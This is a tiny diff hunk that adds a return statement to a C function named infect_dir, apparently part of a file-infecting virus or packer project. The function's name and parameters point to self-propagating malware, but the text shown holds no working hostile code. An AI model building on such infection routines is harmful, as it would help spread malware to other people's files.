@@ -40,4 +40,5 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 		}
 	}
 	ft_close(fd);
+	return TRUE;
 }
